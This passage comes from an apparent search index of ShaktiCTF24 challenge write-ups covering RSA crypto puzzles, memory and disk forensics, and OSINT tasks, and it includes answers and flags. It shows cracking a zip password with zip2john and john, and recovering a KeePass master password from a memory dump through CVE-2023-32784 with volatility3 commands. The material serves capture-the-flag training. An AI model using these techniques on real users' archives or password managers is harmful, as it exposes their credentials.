10425866553433272288676977376976736493869099145622614885498170561565122111495807572631609087909399078701783905493563029715011322065331636751277834978526061 q = 9215753518399683669080201592666232851634627861957009698720674021492716071355990364002777325458055207969176695525292834842774295594232711456066623178861093 Author : im._.a.p Solution : Values of 'p','q','ciphertext','h'(encrypted hint which has the value of e) is given. Th value of the modulus can be found using 'p' and 'q' as p*q = n. From the given code, we understand that 'hint' is xored with a random byte 'b' to get the ciphertext h. To find 'hint', 'h' is xored with each single byte (bruteforced) to get 'hint', thus getting the value of e. from string import printable h= '6f535e1b5e1b061b0c020f0b0b10134f535e1b4852555c575e1b59424f5e1b4f535a4f1b4c5a481b4354495e5f121b0112' m= bytes.fromhex(h) for i in range(256): x=bytes(i^j for j in m) try: x = x.decode() for j in x: assert j in printable print(i,x) except: pass 59 The e = 79400+(the single byte that was xored) :) e = 79459 With the values 'e','n','p','q', the ciphertext ct can be decrypted to get the message. e = 79459 n = p*q phi = (p-1)*(q-1) d = invert(e,phi) print(d) hint = pow(ct,d,n) print(long_to_bytes(hint)) b\"Here is your reward 'vvrkxuqgi{r0i43m0r_f0_hu3_u3gtu3!!!}' You can ask 'Doraemon' to help you with this. Bye!!\" vinegere cipher key : doraemon The message has the encrypted flag and key which is to be decrypted.(vinegere cipher). Flag : shaktictf{d0r43m0n_t0_th3_r3scu3!!!}","title":"eHlvl1"},{"location":"ShaktiCTF24/crypto/eHlvl2/","text":"eHlvl2 Challenge Description : In the sequel to our cryptography challenge, John embarks on a deeper cryptographic journey as he discovers a second email with an even more intricate code. Unraveling this complex puzzle will lead him closer to unveiling the secrets of his uncle's legacy. Can John decipher the cryptic message to unlock the next chapter of his mysterious inheritance? source.py from Crypto.Util.number import* from gmpy2 import * from secret import flag,hint,p,q,n,e m = bytes_to_long(flag) h = [i^n for i in hint] print(f\"h = {(h)}\") ct = pow(m,e,n) print(\"ct = \",ct) print(\"p = \",p) print(\"q = \",q) output.txt h = [94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961521, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961485, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961472, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961472, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961560, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961553, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961555, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961558, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961557, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961554, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961567, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961548] ct = 67505152689735765883791932740130754794209575051890980602600781674553775583258220666677751769017514328860789798530248480070252409403368045243830780631402335081141998133869158737642149138788268554416336823598505828237139319106610394963826005339971182324217930994374291223950212588510430646278894660497182784293 p = 12183163052748797962152083951276410017023381414297530966097687939312125214962148117236820737625705839607797813446007939630781665285299250570390516148709817 q = 7771332213006128671514628362741773970588675422315769188626146232673657294809145256158466322140793048100178050459366164928658849208228006813771330133382669 Author : im._.a.p Solution : Values of 'p','q','ciphertext','h'(encrypted hint which has the value of e) is given. According to the code given, 'hint' is xored with 'n' to get the ciphertext 'h'. To find the 'hint', 'h' is xored with 'n' to get 'hint', thus getting the value of 'e'. n = p*q hi = [i^n for i in h] l = [] for i in hi: x = chr(i) l.append(x) li = ''.join(l) print(li) #The e = 46307 :) With the values 'e','n','p','q', the ciphertext 'ct' can be decrypted to get the flag. e = 46307 n = p*q phi = (p-1)*(q-1) d = invert(e,phi) msg = pow(ct,d,n) print(long_to_bytes(msg)) Flag : shaktictf{RSA_1s_fun_t0_d0_ri8?}","title":"eHlvl2"},{"location":"ShaktiCTF24/crypto/eHlvl2/#ehlvl2","text":"","title":"eHlvl2"},{"location":"ShaktiCTF24/crypto/eHlvl2/#challenge-description","text":"In the sequel to our cryptography challenge, John embarks on a deeper cryptographic journey as he discovers a second email with an even more intricate code. Unraveling this complex puzzle will lead him closer to unveiling the secrets of his uncle's legacy. Can John decipher the cryptic message to unlock the next chapter of his mysterious inheritance? source.py from Crypto.Util.number import* from gmpy2 import * from secret import flag,hint,p,q,n,e m = bytes_to_long(flag) h = [i^n for i in hint] print(f\"h = {(h)}\") ct = pow(m,e,n) print(\"ct = \",ct) print(\"p = \",p) print(\"q = \",q) output.txt h = [94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961521, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961485, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961472, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961472, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961560, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961553, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961555, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961558, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961557, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961554, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961541, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961567, 94679407488132818404660699098842374931489424397235444032237590365827255722083367058700051514705537574410165711179896056841523082769989050948432027496868754650692929646830509011686345739543788335116663878603193093822729085523727432834299509271223474277629700801997533152872965865087117035426980349126297961548] ct = 67505152689735765883791932740130754794209575051890980602600781674553775583258220666677751769017514328860789798530248480070252409403368045243830780631402335081141998133869158737642149138788268554416336823598505828237139319106610394963826005339971182324217930994374291223950212588510430646278894660497182784293 p = 12183163052748797962152083951276410017023381414297530966097687939312125214962148117236820737625705839607797813446007939630781665285299250570390516148709817 q = 7771332213006128671514628362741773970588675422315769188626146232673657294809145256158466322140793048100178050459366164928658849208228006813771330133382669 Author : im._.a.p","title":"Challenge Description :"},{"location":"ShaktiCTF24/crypto/eHlvl2/#solution","text":"Values of 'p','q','ciphertext','h'(encrypted hint which has the value of e) is given. According to the code given, 'hint' is xored with 'n' to get the ciphertext 'h'. To find the 'hint', 'h' is xored with 'n' to get 'hint', thus getting the value of 'e'. n = p*q hi = [i^n for i in h] l = [] for i in hi: x = chr(i) l.append(x) li = ''.join(l) print(li) #The e = 46307 :) With the values 'e','n','p','q', the ciphertext 'ct' can be decrypted to get the flag. e = 46307 n = p*q phi = (p-1)*(q-1) d = invert(e,phi) msg = pow(ct,d,n) print(long_to_bytes(msg)) Flag : shaktictf{RSA_1s_fun_t0_d0_ri8?}","title":"Solution :"},{"location":"ShaktiCTF24/forensics/","text":"Forensics Challenge Name Level Author Aqua Gaze Beginner m1m1 Packet Prowler Easy m1m1 Machevillian Medium hrippi.x_ H4Gr1n Hard hrippi.x_","title":"Forensics"},{"location":"ShaktiCTF24/forensics/#forensics","text":"Challenge Name Level Author Aqua Gaze Beginner m1m1 Packet Prowler Easy m1m1 Machevillian Medium hrippi.x_ H4Gr1n Hard hrippi.x_","title":"Forensics"},{"location":"ShaktiCTF24/forensics/H4Gr1n/","text":"H4Gr1n Description : The Griffin family's personal computer encountered a significant security breach.They promptly took a memory dump, capturing the system's state at the time of the intrusion. Help find the following: Question 1: What is the password manager used by Griffins.Format - ['password_manager_name_with_version_all_lower cases'] Question 2: Retrieve the password of the password manager. Format - ['Password_manager_password' ] Question 3:What is the vulnerability found in password manager - Format - ['CVE-XXXX-XXXX'] Question 4: Find the key that was removed from password manager - Format-['removed_file_password'] Answering the above question will give you the final flag. Author: hrippi.x_ Solution : As a raw file is given the memory dump can be analayzed using the volatility3 framework. Going through the processes we find Keepass as the only password manager present- KeePass Filescanning for keepass shows you the .exe with its version tagged on it. Ans1) KeePass2.53.1 To retrieve the password from the password manager while finding for ways to recover the password we come across the cve for KeePass 2023. Going through the blogs we can find that when the content of the KeePass text box is entered, a managed string is created in its process memory. Whose memory if dumped,will lead to the leakage of the master password. Search for placeholder xCFx25 based on known information. As shown in the figure below, it is found that a placeholder appears first, followed by the plaintext character This gives you the complete password of Keepass: Ans2) allsecretslieinhere_for4r3ason_louis From the research done for the second question the 3rd answer should be quite easy as it is the cve number that has been asked : Ans3) CVE-2023-32784 For the next part you have to dump Keepass from memory using the volatility framework. python3 vol.py -f chall.raw windows.filescan | grep .kdbx Dump the Secrets.kdbx using the command: python3 vol.py -f chall.raw windows.dumpfiles -o output_file --virtaddr 0x8c0ae33b7c70 After retrieving the password manager check the key that was deleted Ans4) U6Vgc6dhNGbw3jSB5vzS Here you go the last answer needed to get the final flag. Flag shaktictf{C0ng0!_m4st3r_cv31s7_34256865}","title":"H4Gr1n"},{"location":"ShaktiCTF24/forensics/H4Gr1n/#h4gr1n","text":"Description : The Griffin family's personal computer encountered a significant security breach.They promptly took a memory dump, capturing the system's state at the time of the intrusion. Help find the following: Question 1: What is the password manager used by Griffins.Format - ['password_manager_name_with_version_all_lower cases'] Question 2: Retrieve the password of the password manager. Format - ['Password_manager_password' ] Question 3:What is the vulnerability found in password manager - Format - ['CVE-XXXX-XXXX'] Question 4: Find the key that was removed from password manager - Format-['removed_file_password'] Answering the above question will give you the final flag. Author: hrippi.x_ Solution : As a raw file is given the memory dump can be analayzed using the volatility3 framework. Going through the processes we find Keepass as the only password manager present- KeePass Filescanning for keepass shows you the .exe with its version tagged on it. Ans1) KeePass2.53.1 To retrieve the password from the password manager while finding for ways to recover the password we come across the cve for KeePass 2023. Going through the blogs we can find that when the content of the KeePass text box is entered, a managed string is created in its process memory. Whose memory if dumped,will lead to the leakage of the master password. Search for placeholder xCFx25 based on known information. As shown in the figure below, it is found that a placeholder appears first, followed by the plaintext character This gives you the complete password of Keepass: Ans2) allsecretslieinhere_for4r3ason_louis From the research done for the second question the 3rd answer should be quite easy as it is the cve number that has been asked : Ans3) CVE-2023-32784 For the next part you have to dump Keepass from memory using the volatility framework. python3 vol.py -f chall.raw windows.filescan | grep .kdbx Dump the Secrets.kdbx using the command: python3 vol.py -f chall.raw windows.dumpfiles -o output_file --virtaddr 0x8c0ae33b7c70 After retrieving the password manager check the key that was deleted Ans4) U6Vgc6dhNGbw3jSB5vzS Here you go the last answer needed to get the final flag.","title":"H4Gr1n"},{"location":"ShaktiCTF24/forensics/H4Gr1n/#flag","text":"shaktictf{C0ng0!_m4st3r_cv31s7_34256865}","title":"Flag"},{"location":"ShaktiCTF24/forensics/Machevillian/","text":"Machevillian Description : Freddy Mileman, a research student sought guidance from his Professor for his impending research paper submission. Subsequently, he received a file from an individual claiming to be the Professor's associate. Upon opening the file, the command line unexpectedly launched. Suspecting potential cybercrime activity, Freddy promptly contacted his friend to assess the situation and mitigate any potential risks. Help find the following: Q1)The name of the person that Freddy is trying to contact in regards of his research paper. Q2)The submission date of Freddy's Research paper that he had specifically noted on his desktop. Q3)The name of the downloaded file that looked suspicious. Author: hrippi.x_ Solution : Open the chall file 'chall.ad1' using FTK Imager. After going through the evidence provided we can conclude that Skype might be the means of communication platform that Freddy might have used as it is also shown in the most recently used folder. To go through his chats go through the path: C\\Users\\mayyoo\\AppData\\Roaming\\Microsoft\\Skype for Desktop\\IndexedDB\\file__0.indexeddb.leveldb\\000030.ldb Extract the file and use a text editor and go through it as all we want is the text info. \"Hello.Mr Mileman I am an associate of Prof. Simon Clarke I was told to give u some suggestions on your report .I shall sent you the corrections in a document please go through it and make the required changes.\" From the above conversation it is clear that an unknown person tried to contact Freddy under the pretext of being an associate of Professor Simon Clarke . Here we go the 1st part of the chall. Going through the file you will realize that an screenshot has been saved in OneDrive of the user in the path: \\Users\\mayyoo\\OneDrive\\Pictures\\Screenshots\\2024-02-08.png The second part of the flag: 12/03/2024/12/45 Going through the recent docs file it can be found in the path \\Users\\mayyoo\\AppData\\Roaming\\Microsoft\\Windows\\Recent we can find a macro enabled file which looks suspicious and which was sent to him by the same unknown contact which can be seen in the previous logs of Skype. Third flag Corrections.docm Flag shaktictf{simonclarke:12/03/2024/12/45:corrections.docm}","title":"Machevillian"},{"location":"ShaktiCTF24/forensics/Machevillian/#machevillian","text":"Description : Freddy Mileman, a research student sought guidance from his Professor for his impending research paper submission. Subsequently, he received a file from an individual claiming to be the Professor's associate. Upon opening the file, the command line unexpectedly launched. Suspecting potential cybercrime activity, Freddy promptly contacted his friend to assess the situation and mitigate any potential risks. Help find the following: Q1)The name of the person that Freddy is trying to contact in regards of his research paper. Q2)The submission date of Freddy's Research paper that he had specifically noted on his desktop. Q3)The name of the downloaded file that looked suspicious. Author: hrippi.x_ Solution : Open the chall file 'chall.ad1' using FTK Imager. After going through the evidence provided we can conclude that Skype might be the means of communication platform that Freddy might have used as it is also shown in the most recently used folder. To go through his chats go through the path: C\\Users\\mayyoo\\AppData\\Roaming\\Microsoft\\Skype for Desktop\\IndexedDB\\file__0.indexeddb.leveldb\\000030.ldb Extract the file and use a text editor and go through it as all we want is the text info. \"Hello.Mr Mileman I am an associate of Prof. Simon Clarke I was told to give u some suggestions on your report .I shall sent you the corrections in a document please go through it and make the required changes.\" From the above conversation it is clear that an unknown person tried to contact Freddy under the pretext of being an associate of Professor Simon Clarke . Here we go the 1st part of the chall. Going through the file you will realize that an screenshot has been saved in OneDrive of the user in the path: \\Users\\mayyoo\\OneDrive\\Pictures\\Screenshots\\2024-02-08.png The second part of the flag: 12/03/2024/12/45 Going through the recent docs file it can be found in the path \\Users\\mayyoo\\AppData\\Roaming\\Microsoft\\Windows\\Recent we can find a macro enabled file which looks suspicious and which was sent to him by the same unknown contact which can be seen in the previous logs of Skype. Third flag Corrections.docm","title":"Machevillian"},{"location":"ShaktiCTF24/forensics/Machevillian/#flag","text":"shaktictf{simonclarke:12/03/2024/12/45:corrections.docm}","title":"Flag"},{"location":"ShaktiCTF24/forensics/aquagaze/","text":"Aqua Gaze Description Unravel the enigma within the file's depths, employing the subtle art of concealment to reveal its hidden message. Author: m1m1 Solution Extract the given chall file; you will get a sea.jpeg. Binwalk the jpeg and extract the embedded zip file. By using John, the password for the zip file will be cracked, which is 'angel1'. the command for John to crack the zip file password: ./zip2john 7D353.zip > zip.txt john zip.txt Extract the zip file using the password, and you will get an artofeye.jpg. When you use jsteg on the image, encoded text can be seen by decoding it, which will give the flag. command for jsteg: jsteg reveal artofeye.jpg encoded text: c2hha3RpY3Rme3RoM19yM2RfczM0XzRuZF90aDNfNHJ0X29mXzN5M18xc19sb29rMW5nX2cwMGR9 Flag: shaktictf{th3_r3d_s34_4nd_th3_4rt_of_3y3_1s_look1ng_g00d}","title":"Aqua Gaze"},{"location":"ShaktiCTF24/forensics/aquagaze/#aqua-gaze","text":"Description Unravel the enigma within the file's depths, employing the subtle art of concealment to reveal its hidden message. Author: m1m1 Solution Extract the given chall file; you will get a sea.jpeg. Binwalk the jpeg and extract the embedded zip file. By using John, the password for the zip file will be cracked, which is 'angel1'. the command for John to crack the zip file password: ./zip2john 7D353.zip > zip.txt john zip.txt Extract the zip file using the password, and you will get an artofeye.jpg. When you use jsteg on the image, encoded text can be seen by decoding it, which will give the flag. command for jsteg: jsteg reveal artofeye.jpg encoded text: c2hha3RpY3Rme3RoM19yM2RfczM0XzRuZF90aDNfNHJ0X29mXzN5M18xc19sb29rMW5nX2cwMGR9 Flag: shaktictf{th3_r3d_s34_4nd_th3_4rt_of_3y3_1s_look1ng_g00d}","title":"Aqua Gaze"},{"location":"ShaktiCTF24/forensics/packetprowler/","text":"Packet Prowler Description Emma works at a multinational corporation (MNC) as a Network Analyst. She was conducting a network capture and attended a meeting, leaving her laptop unattended. Her colleague, Elliot, looked into Emma's laptop and hid a message while the network capture was ongoing. Emma managed to capture the network traffic. Can you help Emma find the hidden message? Author: m1m1 Solution Extract the bt-att packets of len 18 into separate pcap, where the btatt value of 1st byte is taken as a mouse click, 2nd byte is taken as x-coordinate, 3rd byte is taken as y-coordinate, by implementing this in the code, the script will take the att value of each packet, put the x and y coordinates in a list, and plot the coordinates using matplotlib where you can see the hidden message. Script: from scapy.all import * import matplotlib.pyplot as plt PosX = 0 PosY = 0 X_list = [] Y_list = [] frames = rdpcap(\"att.pcapng\") #att.pcapng have att packets of only len 18 for i in range(0,8146): packet = frames[i] data_bytes = raw(packet) data_int = int.from_bytes(data_bytes, \"big\") data_hex = hex(data_int)[-12:] data_bytes = bytes.fromhex(data_hex) mouse_click = data_bytes[0] x_coordinate = data_bytes[1] y_coordinate = data_bytes[2] if x_coordinate > 127: x_coordinate -= 256 if y_coordinate >= 127: y_coordinate -= 256 PosX += x_coordinate PosY += y_coordinate if mouse_click: X_list.append(PosX) Y_list.append(-PosY) fig = plt.figure() ax1 = fig.add_subplot() ax1.scatter(X_list, Y_list) plt.show() Plotted message: You can also give a certain range of packets in the script to get clear text separately. Ranges for each text: range(0,3000): som3t1m35 range(3000,6000): you_h4v3_to range(5700,8146):scrut1n1z3 Flag: shaktiCTF{som3t1m35_you_h4v3_to_scrut1n1z3}","title":"Packet Prowler"},{"location":"ShaktiCTF24/forensics/packetprowler/#packet-prowler","text":"Description Emma works at a multinational corporation (MNC) as a Network Analyst. She was conducting a network capture and attended a meeting, leaving her laptop unattended. Her colleague, Elliot, looked into Emma's laptop and hid a message while the network capture was ongoing. Emma managed to capture the network traffic. Can you help Emma find the hidden message? Author: m1m1 Solution Extract the bt-att packets of len 18 into separate pcap, where the btatt value of 1st byte is taken as a mouse click, 2nd byte is taken as x-coordinate, 3rd byte is taken as y-coordinate, by implementing this in the code, the script will take the att value of each packet, put the x and y coordinates in a list, and plot the coordinates using matplotlib where you can see the hidden message.","title":"Packet Prowler"},{"location":"ShaktiCTF24/forensics/packetprowler/#script","text":"from scapy.all import * import matplotlib.pyplot as plt PosX = 0 PosY = 0 X_list = [] Y_list = [] frames = rdpcap(\"att.pcapng\") #att.pcapng have att packets of only len 18 for i in range(0,8146): packet = frames[i] data_bytes = raw(packet) data_int = int.from_bytes(data_bytes, \"big\") data_hex = hex(data_int)[-12:] data_bytes = bytes.fromhex(data_hex) mouse_click = data_bytes[0] x_coordinate = data_bytes[1] y_coordinate = data_bytes[2] if x_coordinate > 127: x_coordinate -= 256 if y_coordinate >= 127: y_coordinate -= 256 PosX += x_coordinate PosY += y_coordinate if mouse_click: X_list.append(PosX) Y_list.append(-PosY) fig = plt.figure() ax1 = fig.add_subplot() ax1.scatter(X_list, Y_list) plt.show() Plotted message: You can also give a certain range of packets in the script to get clear text separately. Ranges for each text: range(0,3000): som3t1m35 range(3000,6000): you_h4v3_to range(5700,8146):scrut1n1z3 Flag: shaktiCTF{som3t1m35_you_h4v3_to_scrut1n1z3}","title":"Script:"},{"location":"ShaktiCTF24/osint/","text":"OSINT Challenge Name Level Author Ocean Enigma Beginner m1m1 Fortify Easy Ath3n1x Tempo Twist Easy m1m1","title":"OSINT"},{"location":"ShaktiCTF24/osint/#osint","text":"Challenge Name Level Author Ocean Enigma Beginner m1m1 Fortify Easy Ath3n1x Tempo Twist Easy m1m1","title":"OSINT"},{"location":"ShaktiCTF24/osint/Fortify/","text":"Fortify Description : Greetings, Mission Officer. We have received a report stating that a group of anti-nationals is planning to hold a meetig at a fort in Maharashtra. We have identified three possible locations for the meeting: Location 1: Torna Fort location 2: Malhargad killa location 3: Vairatgad Fort However, our officers were unable to find any suspicious activity at these sites. We also know that the group leader is currently in Osaka, Japan and has set the meeting time for 8:00 pm. But the fort is closed at the time. Now its upto you to find the fourth fort and the right time for the meeting. Flag format, if the fort is Malhargad killa and the time is 1.30 pm: shaktictf{malhargad_killa_13:30} Author: Ath3n1x Solution : We are provided with 3 fort locations in Maharashtra. Google my maps is a tool that I swear by when it comes to map related OSINT challenges. Create a new map in my maps. First mark the locations of the 3 forts with (add marker) tool. Then you can connect them using (Draw a line) tool. Now search for forts in maharashtra . Inside the triangle , you can see one fort clearly: Purandar fort The time specified is 8 pm in Japan time. It should be converted to 4.30 pm IST as the forts are in India. At last, convert the time to 24 hour format and assemble the flag as: {purandar_fort_16:30} Flag: shaktictf{purandar_fort_16:30}","title":"Fortify"},{"location":"ShaktiCTF24/osint/Fortify/#fortify","text":"Description : Greetings, Mission Officer. We have received a report stating that a group of anti-nationals is planning to hold a meetig at a fort in Maharashtra. We have identified three possible locations for the meeting: Location 1: Torna Fort location 2: Malhargad killa location 3: Vairatgad Fort However, our officers were unable to find any suspicious activity at these sites. We also know that the group leader is currently in Osaka, Japan and has set the meeting time for 8:00 pm. But the fort is closed at the time. Now its upto you to find the fourth fort and the right time for the meeting. Flag format, if the fort is Malhargad killa and the time is 1.30 pm: shaktictf{malhargad_killa_13:30} Author: Ath3n1x Solution : We are provided with 3 fort locations in Maharashtra. Google my maps is a tool that I swear by when it comes to map related OSINT challenges. Create a new map in my maps. First mark the locations of the 3 forts with (add marker) tool. Then you can connect them using (Draw a line) tool. Now search for forts in maharashtra . Inside the triangle , you can see one fort clearly: Purandar fort The time specified is 8 pm in Japan time. It should be converted to 4.30 pm IST as the forts are in India. At last, convert the time to 24 hour format and assemble the flag as: {purandar_fort_16:30} Flag: shaktictf{purandar_fort_16:30}","title":"Fortify"},{"location":"ShaktiCTF24/osint/oceanenigma/","text":"Ocean Enigma Description In an old library, a strange picture grabs attention. Its faded lines suggest forgotten stories, sparking curiosity. With determination, explorers begin a search for hidden truths, chasing answers hidden in the mysterious image. Can you help unravel these mysteries? 1)Who is the individual from the crew who has previously sailed with the captain of the ship? 2)What was the name of the Captain's close friend from the crew that found the abandoned ship? 3)In the logbook, the captain noted the sighting of land, describing it as an island. What is the name of this enigmatic island? 4)What was the original name of the ship shown in the image? Note: If the answer has space within the text replace them with an underscore example: If the answer is Leonardo Vinci, the format for the answer in the flag is Leonardo_Vinci Author: m1m1 Solution you can refer to the below link where you can get the answers https://www.modelerscentral.com/maritime-history/story-of-the-mary-celeste/ 1) Albert_G_Richardson 2) David_Morehouse 3) Santa_Maria 4) Amazon Flag: shaktictf{Albert_G_Richardson:David_Morehouse:Santa_Maria:Amazon}","title":"Ocean Enigma"},{"location":"ShaktiCTF24/osint/oceanenigma/#ocean-enigma","text":"Description In an old library, a strange picture grabs attention. Its faded lines suggest forgotten stories, sparking curiosity. With determination, explorers begin a search for hidden truths, chasing answers hidden in the mysterious image. Can you help unravel these mysteries? 1)Who is the individual from the crew who has previously sailed with the captain of the ship? 2)What was the name of the Captain's close friend from the crew that found the abandoned ship? 3)In the logbook, the captain noted the sighting of land, describing it as an island. What is the name of this enigmatic island? 4)What was the original name of the ship shown in the image? Note: If the answer has space within the text replace them with an underscore example: If the answer is Leonardo Vinci, the format for the answer in the flag is Leonardo_Vinci Author: m1m1 Solution you can refer to the below link where you can get the answers https://www.modelerscentral.com/maritime-history/story-of-the-mary-celeste/ 1) Albert_G_Richardson 2) David_Morehouse 3) Santa_Maria 4) Amazon Flag: shaktictf{Albert_G_Richardson:David_Morehouse:Santa_Maria:Amazon}","title":"Ocean Enigma"},{"location":"ShaktiCTF24/osint/tempotwist/","text":"Tempo_Twist Description Last year, me and my family went on a trip. There was a watchtower nearby. Can you find the coordinates of the location of the watchtower? All I remember is the place's connection to this song. Note: If the coordinates were (18.431957575736746, 134.77852817528785), the flag should have the next three digits of the coordinates after the decimal. Sample Flag Format: shaktictf{18.431,134.778} Please avoid any spaces in the flag. Author: m1m1 Solution I searched the given lyrics on Google and found the full song of the given audio. In the description, it was mentioned the \"place's connection to this song,\" so when searched for 'Kanmani anbodu song-related location\" and found the 'Guna caves' It was also given in the description that nearby there was a watch tower. When searching for a watch tower near Guna Caves, the map got this location: 'Moir Point'. Take the coordinates. \"10.210508973013074, 77.4481630275408,\" and by modifying it according to flag format, the coordinates were 10.210,77.448 Flag: shaktictf{10.210,77.448}","title":"Tempo_Twist"},{"location":"ShaktiCTF24/osint/tempotwist/#tempo_twist","text":"Description Last year, me and my family went on a trip. There was a watchtower nearby. Can you find the coordinates of the location of the watchtower? All I remember is the place's connection to this song. Note: If the coordinates were (18.431957575736746, 134.77852817528785), the flag should have the next three digits of the coordinates after the decimal. Sample Flag Format: shaktictf{18.431,134.778} Please avoid any spaces in the flag. Author: m1m1 Solution I searched the given lyrics on Google and found the full song of the given audio. In the description, it was mentioned the \"place's connection to this song,\" so when searched for 'Kanmani anbodu song-related location\" and found the 'Guna caves' It was also given in the description that nearby there was a watch tower. When searching for a watch tower near Guna Caves, the map got this location: 'Moir Point'. Take the coordinates. \"10.210508973013074, 77.4481630275408,\" and by modifying it according to flag format, the coordinates were 10.210,77.448 Flag: shaktictf{10.210,77.448}","title":"Tempo_Twist"},{"location":"ShaktiCTF24/pwn/","text":"pwn Challenge Name Level Author Blank_Shell Beginner Ath3n1x Looking_Mirror Beginner Ath3n1x Binary_Heist Easy Ath3n1x Sim Medium Ath3n1x","title":"pwn"},{"location":"ShaktiCTF24/pwn/#pwn","text":"Challenge Name Level Author Blank_Shell Beginner Ath3n1x Looking_Mirror Beginner 